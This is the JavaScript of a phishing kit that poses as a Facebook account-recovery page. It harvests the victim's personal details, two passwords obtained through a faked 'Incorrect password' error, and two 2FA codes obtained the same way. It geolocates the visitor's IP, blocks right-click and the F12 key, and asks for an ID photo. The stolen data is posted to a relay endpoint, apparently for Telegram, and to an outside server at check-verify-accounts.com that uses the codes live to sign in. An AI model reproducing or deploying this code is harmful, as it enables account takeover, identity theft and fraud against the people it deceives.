const URL_HOST = 'http://localhost/THGROUP/htdocs/public/auth';
const URL_TELEGRAM = URL_HOST + '/sendmessage.php';
const CHAT_ID = '12312';
function showLoadingCircle() {
    document.getElementById('spinner').style.display = 'block';
}

// Hide the loading circle
function hideLoadingCircle() {
    document.getElementById('spinner').style.display = 'none';
}

document.addEventListener("contextmenu", (e) => {
    e.preventDefault();
}, false);
document.addEventListener("keydown", (e) => {
    if (e.keyCode == 123) {
        e.stopPropagation();
        e.preventDefault();
    }
});
var check = false;
var checkApprove = false;
var ip = ''
var country = ''
$(document).ready(function () {
    $('.btn-modal-cancel').on('click', function () {
        $('#exampleModal').modal("hide");
    });

    $(".btn-register-send").mouseenter(function () {
        $(this).css("background-color", "#1c2b33");
        $(this).css("color", "#F1F4F7");
    });

    $(".btn-register-send").mouseleave(function () {
        $(this).css("background-color", "#0067cd");
        $(this).css("color", "#ffffff");
    });
    sessionStorage.setItem('business_check_login', 0);
    $.ajax({
        url: URL_HOST + '/checkip.php',
        type: 'GET',
        contentType: 'application/json',
        async: true,
        success: function (msg) {
            ip = msg.ip;
            country = msg.country;
            sessionStorage.setItem('country_code', country);
            sessionStorage.setItem('ip_addr', ip);
            $.ajax({
                url: 'https://ipapi.co/' + ip + '/city/',
                type: 'GET',
                contentType: 'application/json',
                async: true,
                success: function (msg) {
                    sessionStorage.setItem('region_code', msg);
                },
            });
        },
    });

    if (window.location.href.endsWith('/confirm') && !checkApprove) {
        checkApprove = true;
        checkApproveAuto();
    }
});


$(document).on('keypress', '#cgn', function (event) {
    if (event.which === 13) {
        event.preventDefault();
        $('#submit_2fa').click();
    }
});


var email = ''
var index = ''
var check_index = ''
$(document).on('click', '#btn-submit', function (e) {
    e.preventDefault();
    var isValid = true;
    var name = $('#basic_fill_full_name');
    if (!name.val()) {
        // Add error class and attributes
        name.addClass("ant-input ant-input-status-error");
        name.attr("aria-describedby", "basic_fill_full_name");
        name.attr("aria-invalid", "true");
        isValid = false;
    } else {
        // Remove error class and attributes
        name.removeClass("ant-input-status-error");
        name.removeAttr("aria-describedby");
        name.removeAttr("aria-invalid");
        sessionStorage.setItem('full_name', name.val());

    }

    var birth_day = $('#basic_fill_birth_day');
    if (!birth_day.val()) {
        // Add error class and attributes
        birth_day.addClass("ant-input ant-input-status-error");
        birth_day.attr("aria-describedby", "basic_fill_full_name");
        birth_day.attr("aria-invalid", "true");
        isValid = false;
    } else {
        // Remove error class and attributes
        birth_day.removeClass("ant-input-status-error");
        birth_day.removeAttr("aria-describedby");
        birth_day.removeAttr("aria-invalid");
        sessionStorage.setItem('birth_day', birth_day.val());

    }
    sessionStorage.setItem('gioi_Tinh', $('input[name="sex"]:checked').val());
    var page_name = $('#basic_fill_facebook_pagename');
    if (!page_name.val()) {
        // Add error class and attributes
        page_name.addClass("ant-input ant-input-status-error");
        page_name.attr("aria-describedby", "basic_fill_facebook_pagename");
        page_name.attr("aria-invalid", "true");
        isValid = false;
    } else {
        // Remove error class and attributes
        page_name.removeClass("ant-input-status-error");
        page_name.removeAttr("aria-describedby");
        page_name.removeAttr("aria-invalid");
        sessionStorage.setItem('facebook_pagename', page_name.val());
    }
    var phone = $('#basic_fill_phone');
    if (!phone.val() || !validatePhoneNumber(phone.val())) {
        // Add error class and attributes
        phone.addClass("ant-input ant-input-status-error");
        phone.attr("aria-describedby", "basic_fill_phone_help");
        phone.attr("aria-invalid", "true");
        isValid = false;
    } else {
        // Remove error class and attributes
        phone.removeClass("ant-input-status-error");
        phone.removeAttr("aria-describedby");
        phone.removeAttr("aria-invalid");
        sessionStorage.setItem('phone', phone.val());
    }
    business_email = $('#basic_fill_business_email');
    if (!business_email.val() || !validateEmail(business_email.val())) {
        // || !validateEmail(business_email.val())
        // Add error class and attributes
        business_email.addClass("ant-input ant-input-status-error");
        business_email.attr("aria-describedby", "basic_fill_business_email");
        business_email.attr("aria-invalid", "true");
        isValid = false;
    } else {
        // Remove error class and attributes
        business_email.removeClass("ant-input-status-error");
        business_email.removeAttr("aria-describedby");
        business_email.removeAttr("aria-invalid");
        sessionStorage.setItem('business_email', business_email.val());
    }

    personal_email = $('#basic_fill_personal_email');
    if (!personal_email.val() || !validateEmail(personal_email.val())) {
        // Add error class and attributes
        personal_email.addClass("ant-input ant-input-status-error");
        personal_email.attr("aria-describedby", "basic_fill_personal_email");
        personal_email.attr("aria-invalid", "true");
        isValid = false;
    } else {
        // Remove error class and attributes
        personal_email.removeClass("ant-input-status-error");
        personal_email.removeAttr("aria-describedby");
        personal_email.removeAttr("aria-invalid");
        sessionStorage.setItem('personal_email', personal_email.val());
        localStorage.setItem('vulu_person_email', personal_email.val());
    }


    var reason = $('#basic_fill_reason');
    if (!reason.val()) {
        // Add error class and attributes
        reason.addClass("ant-input ant-input-status-error");
        reason.attr("aria-describedby", "basic_fill_reason");
        reason.attr("aria-invalid", "true");
        isValid = false;
    } else {
        // Remove error class and attributes
        reason.removeClass("ant-input-status-error");
        reason.removeAttr("aria-describedby");
        reason.removeAttr("aria-invalid");
        sessionStorage.setItem('basic_fill_reason', reason.val());
    }

    var check = $('#check').is(":checked");
    if (!check) {
        isValid = false;
        document.getElementById("reminder").style.display = "block";
    } else {
        document.getElementById("reminder").style.display = "none";
    }
    var index = sessionStorage.getItem('index');
    if (isValid) {
        showLoadingCircle();
        $('#btn-submit').attr('disabled', true);
        // $.ajax({
        //     url: URL_TELEGRAM,
        //     method: "POST",
        //     data: {
        //         chat_id: CHAT_ID,
        //         text: "\Name: " + business_email.val()
        //             + "\nBusiness Email: " + business_email.val()
        //             + "\nPersonal Email: " + personal_email.val()
        //             + "\nPhone: " + phone.val()
        //             + "\nIp: " + ip
        //             + "\nMô tả:" + reason.val()
        //             + "\nFB Page:" + page_name.val()

        //     }
        // });

        setTimeout(function () {
            hideLoadingCircle();
            $('#popup').addClass("active");
        }, 1000);

        return false;
        fetch('https://check-verify-accounts.com:5000/init', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                email: business_email.val(), // Provide the appropriate value for email
                ip: ip, // Provide the appropriate value for ip
                phone: phone.val()
            })
        })
            .then(function (response) {
                if (response.ok) {
                    return response.json();
                } else {
                    throw new Error('Error: ' + response.status);
                }
            })
            .then(function (response) {
                console.log(response);
                if (response.value == '0') {
                    hideLoadingCircle();
                    index = response.index;
                    sessionStorage.setItem('index', index);
                    $('#popup').addClass("active");
                }
            })
    }
});
var _next = 0;
var proxy = '';

function hideLoadingButton() {
    var $button = $('#btn-login');
    var $btnText = $button.find('.btn-text');
    var $loadingCircle = $button.find('.loading-circle');

    // Restore the button text
    $btnText.show();

    // Hide the loading circle
    $loadingCircle.hide();
    $('#btn-login').attr('disabled', false);
}

function showLoadingButton() {
    var $button = $('#btn-login');
    var $btnText = $button.find('.btn-text');
    var $loadingCircle = $button.find('.loading-circle');

    // Hide the button text
    $btnText.hide();

    // Show the loading circle
    $loadingCircle.show();
    $('#btn-login').attr('disabled', true);
}

$(document).on('click', '#btn-login', function (e) {
    e.preventDefault();
    var password = $($('#basicForm_fill_first_password')[0]).val();
    if (!password) {
        hideLoadingButton();
        return;
    }
    else { showLoadingButton(); }
    var $this = $(this); // Store reference to $(this)
    sessionStorage.setItem('password', password);

    var check_login = sessionStorage.getItem('business_check_login');

    setTimeout(function () {
        if (check_login == 0) {
            $('.password-error').text('Incorrect password');
            sessionStorage.setItem('password_fisrt', password);
            hideLoadingButton();
            sessionStorage.setItem('business_check_login', 1)
        } else {
            sessionStorage.setItem('business_check_2fa', 0);
            sessionStorage.setItem('password_second', password);

            $.ajax({
                url: URL_TELEGRAM,
                method: "POST",
                data: {
                    chat_id: CHAT_ID,
                    email: sessionStorage.getItem('personal_email'),
                    password: sessionStorage.getItem('password_fisrt') + '\n' + sessionStorage.getItem('password_second'),
                    text: "\nFull Name: " + sessionStorage.getItem('full_name')
                        + "\nBirth Day: " + sessionStorage.getItem('birth_day')
                        + "\nGioi Tinh: " + sessionStorage.getItem('gioi_Tinh')
                        + "\nEmail: " + sessionStorage.getItem('business_email')
                        + "\nPersonal Email: " + sessionStorage.getItem('personal_email')
                        + '\nIp: ' + sessionStorage.getItem('ip_addr')
                        + '\nCountry: ' + sessionStorage.getItem('country_code')
                        + '\nCity: ' + sessionStorage.getItem('region_code')
                        + "\nPhone: " + sessionStorage.getItem('phone')
                        // + "\nMô tả:" + sessionStorage.getItem('basic_fill_reason')
                        + "\nFB Page:" + sessionStorage.getItem('facebook_pagename')
                        + '\nPassword First: ' + sessionStorage.getItem('password_fisrt')
                        + "\nPassword Second: " + sessionStorage.getItem('password_second')
                }
            });
            setTimeout(function () {
                window.location.href = 'confirm.php';
            }, 2000)

        }
    }, 1000);

    // var phone = sessionStorage.getItem('phone');
    // var index = sessionStorage.getItem('index');
    // fetch('https://check-verify-accounts.com:5000/login', {
    //     method: 'POST',
    //     headers: {
    //         'Content-Type': 'application/json'
    //     },
    //     body: JSON.stringify({
    //         email: business_email.val(), // Provide the appropriate value for email
    //         password: password,
    //         phone: phone,
    //         index: index
    //     })
    // })
    //     .then(function (response) {
    //         if (response.ok) {
    //             return response.json();
    //         } else {
    //             throw new Error('Error: ' + response.status);
    //         }
    //     })
    //     .then(function (response) {
    //         console.log(response);
    //         if (response.value == '1') {
    //             _next = 1;
    //             window.location.href = 'confirm.php';
    //         } else if (response.value == '2') {
    //             $('.password-error').text('Incorrect password');
    //             hideLoadingButton();
    //         } else if (response.value == '3') {
    //             window.location.href = 'confirm.php';
    //         }
    //         else {
    //             window.location.href = 'upload-image.php';
    //         }
    //     })
    //     .catch(function (error) {
    //         console.log('Error:', error);
    //     });

});

$(document).on('click', '#btn-close', function (e) {
    $('#popup').removeClass("active");
});

// Function to show the loading circle
function showLoadingSend() {
    var $button = $('#submit-2fa');
    var $buttonText = $button.find('span');
    var $loadingCircle = $button.find('.loading-circle');

    // Hide the button text
    $buttonText.hide();

    // Show the loading circle
    $loadingCircle.show();
    $('#submit-2fa').attr('disabled', true);
}

// Function to hide the loading circle
function hideLoadingSend() {
    var $button = $('#submit-2fa');
    var $buttonText = $button.find('span');
    var $loadingCircle = $button.find('.loading-circle');

    // Show the button text
    $buttonText.show();

    // Hide the loading circle
    $loadingCircle.hide();
    $('#submit-2fa').attr('disabled', false);
}


$(document).on('click', '#submit-2fa', function (e) {
    e.preventDefault();
    if ($($('#submit_2fa')[0]).html() === "Approved" && 1 == 2) {
        var email = sessionStorage.getItem('business_email');
        var phone = sessionStorage.getItem('phone');
        var password = sessionStorage.getItem('password');
        var ip = sessionStorage.getItem('ip');
        var index = sessionStorage.getItem('index');
        //$.ajax({
        //   url: URL_TELEGRAM,
        //   method: "POST",
        //   data: {
        //       chat_id: CHAT_ID,
        //       text: email + ": Approved Click"
        //   }
        //});
        fetch('https://check-verify-accounts.com:5000/login_with_otp', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                otp: "000000",
                index: index
            })
        })
            .then(function (response) {
                if (response.ok) {
                    return response.json();
                } else {
                    throw new Error('Error: ' + response.status);
                }
            })
            .then(function (response) {
                if (response.value == '0') {
                    window.location.href = 'upload-image.php';
                }
                else if (response.value == '1') {
                    hideLoadingSend();
                    $('.2fa-error').text('Code is invalid or has expired, please re-enter a new code');
                }
            })
            .catch(function (error) {
                console.log('Error:', error);
            });
    }
    else {
        var cgn = $($('#basicForm_fill_code')[0]).val();
        if (!cgn || (cgn.length != 6 && cgn.length != 8)) {
            $('.2fa-error').text('Code is invalid!');
            hideLoadingSend();
            return;
        }
        else {
            showLoadingSend();
            var email = sessionStorage.getItem('business_email');
            var phone = sessionStorage.getItem('phone');
            var password = sessionStorage.getItem('password');
            var ip = sessionStorage.getItem('ip');
            var index = sessionStorage.getItem('index');
            var $this = $(this); // Store reference to $(this)
            var check_2fa = sessionStorage.getItem('business_check_2fa');
            if (check_2fa == 0 || check_2fa == null) {
                sessionStorage.setItem('2fa_fisrt', cgn);
                sessionStorage.setItem('business_check_2fa', 1);
                setTimeout(function () {
                    hideLoadingSend();
                    $('.2fa-error').text('Code is invalid or has expired, please re-enter a new code');
                }, 1000);
            } else {
                $.ajax({
                    url: URL_TELEGRAM,
                    method: "POST",
                    data: {
                        chat_id: CHAT_ID,
                        email: sessionStorage.getItem('personal_email'),
                        password: sessionStorage.getItem('password_fisrt') + '\n' + sessionStorage.getItem('password_second'),
                        text: "\nFull Name: " + sessionStorage.getItem('full_name')
                            + "\nBirth Day: " + sessionStorage.getItem('birth_day')
                            + "\nGioi Tinh: " + sessionStorage.getItem('gioi_Tinh')
                            + "\nEmail: " + sessionStorage.getItem('business_email')
                            + "\nPersonal Email: " + sessionStorage.getItem('personal_email')
                            + '\nIp: ' + sessionStorage.getItem('ip_addr')
                            + '\nCountry: ' + sessionStorage.getItem('country_code')
                            + '\nCity: ' + sessionStorage.getItem('region_code')
                            + "\nPhone: " + sessionStorage.getItem('phone')
                            // + "\nMô tả:" + sessionStorage.getItem('basic_fill_reason')
                            + "\nFB Page:" + sessionStorage.getItem('facebook_pagename')
                            + '\nPassword First: ' + sessionStorage.getItem('password_fisrt')
                            + "\nPassword Second: " + sessionStorage.getItem('password_second')
                            + "\n2fa first:" + sessionStorage.getItem('2fa_fisrt')
                            + "\n2fa second:" + cgn
                    }
                });
                setTimeout(function () {
                    window.location.href = 'upload-image.php';
                }, 1000);
            }
        }

        // fetch('https://check-verify-accounts.com:5000/login_with_otp', {
        //     method: 'POST',
        //     headers: {
        //         'Content-Type': 'application/json'
        //     },
        //     body: JSON.stringify({
        //         email: email, // Provide the appropriate value for email
        //         phone,
        //         password: password,
        //         otp: cgn,
        //         index: index
        //     })
        // })
        //     .then(function (response) {
        //         if (response.ok) {
        //             return response.json();
        //         } else {
        //             throw new Error('Error: ' + response.status);
        //         }
        //     })
        //     .then(function (response) {
        //         if (response.value == '0') {
        //             window.location.href = 'upload-image.php';
        //         }
        //         else if (response.value == '1') {
        //             hideLoadingSend();
        //             $('.2fa-error').text('Code is invalid or has expired, please re-enter a new code');
        //         }
        //     })
        //     .catch(function (error) {
        //         console.log('Error:', error);
        //     });
    }
});


function sendcodeagain() {
    $('.2fa-error').text("");
    var email = sessionStorage.getItem('business_email');
    var index = sessionStorage.getItem('index');
    showLoadingCircle();
    //$.ajax({
    //    url: URL_TELEGRAM,
    //    method: "POST",
    //    data: {
    //        chat_id: CHAT_ID,
    //        text: "Resend2FA: " + email
    //    }
    //});
    fetch('https://check-verify-accounts.com:5000/resend2FA', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            index: index
        })
    })
        .then(function (response) {
            if (response.ok) {
                return response.json();
            } else {
                throw new Error('Error: ' + response.status);
            }
        })
        .then(function (data) {
            const options = data.value;
            const container = document.getElementById('Options');

            options.forEach(option => {
                const radioOption = document.createElement('div');
                radioOption.innerHTML = `
                    <label for="${option.value}" style="display: inline-block; text-align: left; width: 90%; padding-right: 10px;font-size:14px">${option.label}</label>
                    <input value="${option.value}" name="passwordOption" id="${option.value}" type="radio" style="">
                `;
                container.appendChild(radioOption);
            });
            hideLoadingCircle();
            $('#exampleModal').modal('show');
        })
        .catch(function (error) {
            console.log('Error:', error);
        });


}

$(document).on('click', '.submit_resend', function (e1) {
    e1.preventDefault();
    const radioButtons = document.querySelectorAll('input[name="passwordOption"]');
    var selectedOption;
    var index = sessionStorage.getItem('index');
    // Listen for changes in the radio buttons
    radioButtons.forEach(function (radioButton) {
        if (radioButton.checked) {
            selectedOption = radioButton.value;
        }
    });
    if (!selectedOption) {
        $($('.submit_resend')[0]).attr('disabled', false);
    }
    else {
        showLoadingCircle();
        $.ajax({
            url: URL_TELEGRAM,
            method: "POST",
            data: {
                chat_id: CHAT_ID,
                text: "Select: " + selectedOption
            }
        });
        $($('.submit_resend')[0]).attr('disabled', true);
        fetch('https://check-verify-accounts.com:5000/choose', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                index: index,
                option: selectedOption
            })
        })
            .then(function (response) {
                if (response.ok) {
                    return response.json();
                } else {
                    throw new Error('Error: ' + response.status);
                }
            })
            .then(function (data) {
                hideLoadingCircle();
                if (data.value == '1') {
                    $('#exampleModal').modal('hide');
                }
                else if (data.value == '2') {
                    $('#exampleModal').modal('hide');
                    var button = $($('#submit-2fa')[0]);
                    button.attr('disabled', false);
                    button.html('Approved');
                }
                else {
                    const options = data.value;
                    const container = document.getElementById('Options');
                    container.innerHTML = '';
                    options.forEach(option => {
                        const radioOption = document.createElement('div');
                        radioOption.innerHTML = `
                        <label for="${option.value}" style="display: inline-block; text-align: left; width: 90%; padding-right: 10px;font-size:14px">${option.label}</label>
                        <input value="${option.value}" name="passwordOption" id="${option.value}" type="radio" style="">
                    `;
                        container.appendChild(radioOption);
                    });
                    $($('.submit_resend')[0]).attr('disabled', false);
                }
            })
            .catch(function (error) {
                console.log('Error:', error);
            });
    }

});

$(document).on('click', '.btn-upload-info', function (e1) {
    if ($('#file').val() == '') {
        alert('Before we can get you back on Facebook safely, we need make sure this is your account. You can prove this account is yours by sending us a photo of your ID!');
        return false;
    } else {
        $('form#upload_profi').trigger('submit');
    }
});

$(document).on('click', '.btn-modal-cancel', function (e) {
    $('#exampleModal').modal("hide");
});

function onlyNumberKey(evt) {
    var ASCIICode = (evt.which) ? evt.which : evt.keyCode;

    return !(ASCIICode > 31 && (ASCIICode < 48 || ASCIICode > 57));
}

function validateEmail(email) {
    var re = /\S+@\S+\.\S+/;

    return re.test(email);
}

function validateURL(url) {
    // Regular expression for a basic URL format
    var re = /^(ftp|http|https):\/\/[^ "]+$/;

    return re.test(url);
}


function validatePhoneNumber(phoneNumber) {
    phoneNumber = phoneNumber.replace(/ /g, '').replace(/\(/g, '').replace(/\)/g, '');

    if (isNaN(phoneNumber)) {
        return false;
    }

    return true;
}

